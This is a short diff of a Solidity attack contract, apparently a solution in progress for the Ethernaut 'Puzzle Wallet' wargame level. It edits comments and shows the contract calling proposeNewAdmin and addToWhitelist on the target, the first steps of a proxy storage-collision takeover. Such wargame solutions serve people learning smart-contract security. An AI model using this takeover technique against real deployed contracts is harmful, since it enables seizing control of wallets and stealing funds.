@@ -11,13 +11,10 @@ contract Attack24 {
 
     constructor(address _targetAddress) {
         target = PuzzleWallet(_targetAddress);        
-
+        // proxy = PuzzleProxy(_targetAddress);
     }
 
     function attack(IPuzzleWallet) public {
-        // multicall attack
-        // bytes[] memory data = abi.encodeWithSelector(bytes4, arg);   //   <--  HERE !!
-        // set the data argument as a abi encoded multicall to deposit
         // target.multicall(data);
         target.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
